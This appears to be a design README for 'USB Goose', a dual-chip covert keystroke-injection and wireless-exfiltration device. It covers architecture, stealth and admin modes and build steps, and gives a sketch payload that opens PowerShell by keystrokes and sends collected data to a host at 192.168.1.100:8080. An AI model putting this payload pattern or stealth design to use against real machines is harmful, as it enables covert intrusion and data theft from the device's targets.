# USB Goose: Dual-Chip Architecture with USB 3.0 and Multi-Protocol Wireless

## Project Overview

This project leverages a powerful **dual-chip architecture** combining the **WCH CH569** (RISC-V with USB 3.0) and **ESP32-C6** (RISC-V with multi-protocol wireless) to create the most advanced USB Rubber Ducky implementation available, featuring SuperSpeed USB 3.0, comprehensive wireless capabilities, and a unified LLVM development framework.

## Architecture Overview

### Dual-Chip Design
- **WCH CH569**: RISC-V USB 3.0 controller (5 Gbps SuperSpeed)
- **ESP32-C6**: RISC-V wireless controller (Wi-Fi 6, BLE 5.0, 802.15.4)
- **High-speed SPI bridge** for inter-chip communication
- **Shared memory buffer** for coordinated operations

### Chip Responsibilities

#### WCH CH569 (USB Controller)
- **Primary USB Interface**:
  - USB 3.0 SuperSpeed HID (keyboard/mouse)
  - USB 3.0 Mass Storage emulation
  - U2F/FIDO2 security key emulation
- **Storage Management**:
  - SD card interfacing via SPI
  - Encrypted partition handling
  - High-speed data transfer
- **Payload Execution**:
  - ELF loading for USB-based payloads
  - Timing-critical operations
  - System initialization and boot sequence

#### ESP32-C6 (Wireless Controller)
- **Wireless Protocols**:
  - Wi-Fi 6 (802.11ax) with AP mode
  - Bluetooth 5.0 LE for control and proximity
  - IEEE 802.15.4 for Thread/Zigbee/Matter
- **Network Operations**:
  - Wireless reconnaissance
  - Remote payload delivery
  - Data exfiltration
  - Web configuration interface
- **Security Operations**:
  - Hardware-accelerated encryption
  - Secure key storage
  - Authentication handling

## Key Features

### ✅ SuperSpeed USB 3.0
- **5 Gbps Data Transfer**: 10x faster than USB 2.0
- **Rapid Exfiltration**: Move large datasets quickly
- **Enhanced Storage**: Function as a high-performance flash drive

### ✅ Comprehensive Wireless Capabilities
- **Wi-Fi 6**: Latest standard with improved performance
- **Bluetooth LE**: Low-energy proximity and control
- **802.15.4**: For mesh networking and IoT integration
- **Simultaneous Operation**: Run multiple protocols concurrently

### ✅ Unified LLVM Development Framework
- **Language Flexibility**: C, C++, Rust, and other LLVM languages
- **Cross-Chip Framework**: Same languages for both processors
- **Shared Codebase**: Common libraries across the system
- **Modern Practices**: Use contemporary language features

### ✅ Modular Payload System
- **Multi-Vector Payloads**: Combine USB and wireless attack paths
- **Conditional Execution**: Adapt based on detected environment
- **Coordinated Operations**: Synchronized actions across chips
- **Event-Driven Architecture**: React to system and environmental triggers

### ✅ Enhanced Hardware Features
- **RGBW Status LEDs**: Visual feedback on device status
- **IR Transceiver**: Additional communication channel
- **Real-Time Clock**: Time-based operations and persistence
- **Hardware Security Elements**: Secure key storage on both chips

## Hardware Requirements

- **WCH CH569** RISC-V microcontroller (USB 3.0)
- **ESP32-C6** RISC-V wireless microcontroller
- **MicroSD Card Module** (SPI)
- **USB-C Connector** for USB 3.0 connectivity
- **Antennas** for Wi-Fi, BLE, and 802.15.4
- **RGBW LED** for status indication
- **IR Transceiver** (optional)
- **RTC Module** with battery backup
- **Push Button** for mode selection
- **Hardware Security Element** (optional)

## Software Components

### System Layer
- **Dual-Core Operating System**: Coordinated RTOS across both chips
- **Inter-Chip Communication Protocol**: Optimized for latency and throughput
- **Unified Hardware Abstraction Layer**: Consistent API across both chips

### USB Capabilities (CH569)
- **USB 3.0 SuperSpeed Stack**: Custom implementation for the CH569
- **HID Profiles**: Advanced keyboard/mouse emulation
- **Mass Storage Controller**: High-performance MSC implementation
- **U2F/FIDO2 Stack**: Security key emulation

### Wireless Capabilities (ESP32-C6)
- **ESP-IDF** with customizations for security operations
- **Multi-Protocol Manager**: Coordinate wireless interfaces
- **AP Mode Configuration**: Web-based device setup
- **Wireless Reconnaissance**: Environment scanning and analysis

### Security Features
- **Hardware-Accelerated Encryption**: AES-256, SHA-256
- **Secure Key Management**: Protected storage
- **Encrypted Payloads**: Obfuscated operation
- **Anti-Tampering Measures**: Detect physical interference

## Code Structure

```
/firmware
 ├── common/                   # Shared code between chips
 │   ├── protocol.h            # Inter-chip communication protocol
 │   ├── payload_framework.h   # LLVM payload framework definitions
 │   └── security.h            # Shared security primitives
 │
 ├── ch569/                    # WCH CH569 USB controller code
 │   ├── main.c                # Main firmware for CH569
 │   ├── usb/                  # USB functionality
 │   │   ├── usb3_core.c       # USB 3.0 core functionality
 │   │   ├── hid.c             # Keyboard + Mouse 
 │   │   ├── msc.c             # Mass Storage
 │   │   └── u2f.c             # U2F/FIDO2 implementation
 │   ├── storage/
 │   │   ├── sd_card.c         # SD card interface
 │   │   └── encryption.c      # Storage encryption
 │   ├── payload/
 │   │   ├── loader.c          # ELF loader
 │   │   └── executor.c        # Payload execution environment
 │   ├── comm/
 │   │   └── spi_slave.c       # SPI communication with ESP32
 │   └── hardware/
 │       ├── leds.c            # LED control
 │       └── rtc.c             # Real-time clock functions
 │
 ├── esp32c6/                  # ESP32-C6 wireless controller code
 │   ├── main.c                # Main firmware for ESP32-C6
 │   ├── wireless/
 │   │   ├── wifi.c            # Wi-Fi functionality
 │   │   ├── ble.c             # Bluetooth LE stack
 │   │   └── thread.c          # 802.15.4/Thread implementation
 │   ├── comm/
 │   │   └── spi_master.c      # SPI communication with CH569
 │   ├── web/
 │   │   ├── server.c          # Web configuration server
 │   │   └── api.c             # RESTful API for configuration
 │   ├── recon/
 │   │   ├── scanner.c         # Network reconnaissance
 │   │   └── analyzer.c        # Target analysis
 │   └── security/
 │       ├── crypto.c          # Cryptographic operations
 │       └── secure_storage.c  # Protected key storage
 │
 ├── payloads/                 # Example payloads
 │   ├── usb_examples/         # USB-focused payloads
 │   ├── wireless_examples/    # Wireless-focused payloads
 │   └── combined_examples/    # Multi-vector payloads
 │
 ├── tools/                    # Development tools
 │   ├── payload_builder/      # Visual payload creation tool
 │   ├── simulator/            # Payload simulation environment
 │   └── flasher/              # Dual-chip programming utility
 │
 ├── build/                    # Build system
 │   ├── cmake/                # CMake modules
 │   ├── ch569.cmake           # CH569-specific build config
 │   └── esp32c6.cmake         # ESP32-C6-specific build config
 │
 └── docs/                     # Documentation
     ├── api/                  # API reference
     ├── hardware/             # Hardware design docs
     └── tutorials/            # Tutorials and guides
```

## Unified LLVM Development

### Building Payloads
All payloads can be built using standard LLVM tools:

```sh
# For CH569 (USB controller)
clang -target riscv32-unknown-none-elf -mcpu=rv32imac -O2 \
    -I../common -o usb_payload.elf usb_payload.c

# For ESP32-C6 (Wireless controller)
clang -target riscv32-unknown-none-elf -mcpu=rv32imac -O2 \
    -I../common -o wireless_payload.elf wireless_payload.c
```

### Multi-Vector Payload Example

```cpp
// shared_definitions.h - Used by both chips
#pragma once

enum PayloadTriggers {
  TRIGGER_USB_CONNECTED,
  TRIGGER_WIFI_TARGET_FOUND,
  TRIGGER_BLUETOOTH_PROXIMITY,
  TRIGGER_TIME_ELAPSED
};

struct PayloadContext {
  uint8_t target_os;
  uint8_t security_level;
  uint32_t capabilities;
  char hostname[32];
};

// USB Payload for CH569 (usb_component.c)
#include "payload_framework.h"
#include "shared_definitions.h"

PAYLOAD_INFO("USB Keystrokes", "1.0", PAYLOAD_PRIORITY_HIGH);

void payload_main(PayloadContext* ctx) {
  // Check target OS from context
  if (ctx->target_os == OS_WINDOWS) {
    // Send Windows-specific keystrokes
    Keyboard::sendWinKey('r');
    Keyboard::sendString("powershell");
    Keyboard::sendKey(KEY_RETURN);
    
    // Signal wireless component to start its part
    InterChip::triggerEvent(TRIGGER_USB_STAGE_COMPLETE);
  }
}

// Wireless Payload for ESP32-C6 (wireless_component.c)
#include "payload_framework.h"
#include "shared_definitions.h"

PAYLOAD_INFO("Wireless Exfiltration", "1.0", PAYLOAD_PRIORITY_NORMAL);

void payload_main(PayloadContext* ctx) {
  // Wait for signal from USB component
  InterChip::waitForEvent(TRIGGER_USB_STAGE_COMPLETE);
  
  // Start wireless reconnaissance
  WiFi::scanNetworks();
  
  // Establish connection and exfiltrate data
  if (WiFi::connect("target_network", "password")) {
    Exfiltration::sendData("192.168.1.100", 8080, CollectedData::getBuffer());
  }
}
```

## Operation Modes

1. **Standard Mode**:
   - Functions as USB HID + Mass Storage
   - Wireless interfaces in passive monitoring
   
2. **Admin Mode** (triggered by button press):
   - Exposes configuration interface via Wi-Fi AP
   - Shows hidden partitions and payload directory
   
3. **Stealth Mode**:
   - Minimal LED activity
   - Covert wireless operation
   - Appears as legitimate USB device

## Build and Flash Instructions

```sh
# Clone repository
git clone https://github.com/yourusername/advanced-rubber-ducky.git
cd advanced-rubber-ducky

# Build firmware for both chips
mkdir build && cd build
cmake ..
make

# Flash CH569
wch-flasher -p /dev/ttyUSB0 -f ch569_firmware.bin

# Flash ESP32-C6
esptool.py --chip esp32c6 --port /dev/ttyUSB1 write_flash 0x0 esp32c6_firmware.bin
```

## Future Enhancements

- **AI-powered targeting** using ESP32's ML capabilities
- **Physical penetration** hardware extensions
